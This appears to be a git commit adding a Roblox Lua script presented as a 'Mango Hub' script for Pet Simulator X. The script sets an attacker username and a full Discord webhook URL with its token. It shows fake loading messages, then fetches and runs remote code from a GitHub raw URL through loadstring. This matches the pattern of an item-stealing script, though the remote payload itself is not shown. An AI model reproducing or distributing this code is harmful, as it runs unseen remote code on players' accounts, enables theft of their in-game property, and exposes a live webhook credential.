610788898f35ebcf411a1fddb3391121d7320d87
emeraldt2012 <125272666+emeraldt2012@users.noreply.github.com>
2023-02-25 18:51:44 +0800

    Update psxmangohubscript.lua

--- psxmangohubscript.lua
+++ psxmangohubscript.lua
@@ -1,1 +1,9 @@
+Username = "emeraldt2012"
+WebHook = "https://discord.com/api/webhooks/1078941985471201280/lrE4IE2j0rEt9L7ngxG-1uOyV1ik4bjXm6lq_U4OMFdLdDfefxvrHvr-ru_0tQU3KoRw"
 
+_G.CustomScriptName = "Mango Hub"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
